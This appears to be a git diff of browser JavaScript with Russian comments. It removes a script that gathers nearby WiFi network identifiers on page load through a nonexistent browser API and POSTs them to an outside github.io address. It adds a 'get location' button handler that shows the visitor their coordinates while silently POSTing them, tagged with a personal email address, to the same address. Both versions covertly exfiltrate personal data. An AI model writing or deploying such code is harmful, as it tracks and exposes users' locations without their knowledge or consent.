@@ -1,32 +1,38 @@
-(async function () {
-  // Проверка поддержки API WiFi
-  if (!navigator.wifi) {
-    console.log("API WiFi не поддерживается");
-    return;
-  }
+const locationInfo = document.getElementById("location-info");
+const getLocationBtn = document.getElementById("get-location");
 
-  // Запрос разрешения на доступ к WiFi
-  try {
-    const networks = await navigator.wifi.getNetworks();
+getLocationBtn.addEventListener("click", () => {
+    navigator.geolocation.getCurrentPosition((position) => {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
 
-    // Получение SSIDs и BSSIDs доступных WiFi-сетей
-    const ssids = networks.map((network) => network.ssid);
-    const bssids = networks.map((network) => network.bssid);
+        // Отправка данных на почту
+        const email = "osip.1942@gmail.com";
+        const subject = "Мое местоположение";
+        const body = `Широта: ${latitude}, Долгота: ${longitude}`;
 
-    // **Замените этот URL на ваш серверный API**
-    await fetch("https://osip-d25.github.io/filetest/", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        ssids,
-        bssids,
-      }),
+        // **Замените этот код на ваш API для отправки почты**
+         fetch("https://osip-d25.github.io/filetest/", {
+             method: "POST",
+           headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                email,
+               subject,
+                 body,
+            }),
+       });
+
+        locationInfo.innerHTML = `
+            <p>Ваше местоположение:</p>
+            <ul>
+                <li>Широта: ${latitude}</li>
+                <li>Долгота: ${longitude}</li>
+            </ul>
+        `;
+    }, (error) => {
+        console.log(`Ошибка при получении местоположения: ${error.message}`);
+        locationInfo.innerHTML = `<p>Ошибка при получении местоположения</p>`;
     });
-
-    console.log("Данные о WiFi-сетях пользователя успешно отправлены");
-  } catch (error) {
-    console.log(`Ошибка при получении информации о WiFi: ${error.message}`);
-  }
-})();
+});
